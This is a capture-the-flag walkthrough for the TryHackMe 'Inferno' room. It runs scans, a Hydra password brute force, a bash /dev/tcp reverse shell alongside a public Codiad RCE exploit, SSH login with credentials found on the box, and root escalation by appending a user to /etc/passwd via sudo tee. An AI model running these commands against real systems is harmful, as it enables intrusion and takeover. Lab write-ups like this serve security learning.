# Inferno

**Room Link:** [https://tryhackme.com/r/room/inferno](https://tryhackme.com/r/room/inferno)

### **Scans** <a href="#scans" id="scans"></a>

Initial scan

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## **TCP/80 - HTTP**

### Find Pages <a href="#find-pages" id="find-pages"></a>

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



### **Hydra**

Since we have no information at this point we just try admin as the username

**Kali**

```
hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt $VICTIM http-get "/inferno/" -V
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



After some digging we can see this is a codiad ide which has a RCE exploit

**Kali #1**

```
echo 'bash -c "bash -i >/dev/tcp/10.10.183.11/4445 0>&1 2>&1"' | nc -lnvp 4444
```

**Kali #2**

```
nc -nlvp 4445
```

**Kali #3**

```
searchsploit codiad
searchsploit -m multiple/webapps/49705.py
python3 49705.py http://admin:dante1@$VICTIM/inferno/ admin dante1 $KALI 4444 linux
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Autocomplete

**Victim**

```
python3 -c 'import pty; pty.spawn("/bin/sh")'
ctrl + Z
stty raw -echo;fg
```



## Lateral Movement

**Victim**

```
cd /home/dante/Downloads
ls -lah
cat .download.dat
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
cat .download.dat
```

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



## **TCP/22 - SSH**

**Kali**

```
ssh dante@$VICTIM
Password: V1rg1l10h3lpm3
```

<figure><img src="../../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>

## **Privilege Escalation**

**Exploit:** [https://gtfobins.github.io/gtfobins/tee/](https://gtfobins.github.io/gtfobins/tee/)

**Victim**

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
LFILE=/etc/passwd
echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' | sudo tee -a "$LFILE"

su new
Password: 123
```

<figure><img src="../../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>

